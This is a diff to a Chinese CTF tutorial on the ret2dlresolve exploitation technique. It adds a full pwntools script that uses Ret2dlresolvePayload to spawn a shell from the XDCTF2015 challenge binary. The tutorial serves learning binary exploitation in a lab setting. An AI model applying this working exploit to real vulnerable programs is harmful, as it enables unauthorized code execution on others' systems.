@@ -55,6 +55,7 @@
     -   stage 2 测试控制程序执行dl_resolve函数，并且相应参数指向正常write函数的plt时的执行效果。
     -   stage 3 测试控制程序执行dl_resolve函数，并且相应参数指向伪造的write函数的plt时的执行效果。
 2.  利用roputils中已经集成好的工具来实现攻击，从而获取shell。
+3.  利用pwntools中集成好的模块实现共计，从而获取shell。
 
 #### 正常攻击
 
@@ -653,7 +654,7 @@ core  main.c     stage2.py  stage4.py  stage6.py
 main  stage1.py  stage3.py  stage5.py
 ```
 
-#### 工具攻击
+#### roputils 工具攻击
 
 根据上面的介绍，我们应该很容易可以理解这个攻击了。下面我们直接使用roputil来进行攻击。代码如下
 
@@ -727,7 +728,34 @@ __init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py
 
 ```
 
-### 题目
+#### pwntools Ret2dlresolvePayload 函数
+
+pwntools 在某个版本也集成支持了 ret2dlresolve 的 payload 生成函数，完整脚本如下:
+
+```python
+from pwn import *
+
+elf = ELF('main')
+rop = ROP(elf)
+dlresolve = Ret2dlresolvePayload(elf, symbol= 'system', args=["/bin/sh"])
+
+rop.read(0, dlresolve.data_addr)
+rop.ret2dlresolve(dlresolve)
+
+raw_rop = rop.chain()
+p = elf.process()
+payload = {
+    0x6c+4: raw_rop,
+    0x100:  dlresolve.payload
+}
+
+payload = fit(payload)
+
+p.recvuntil('Welcome to XDCTF2015~')
+p.sendline(payload)
+
+p.interactive()
+```
 
 
 
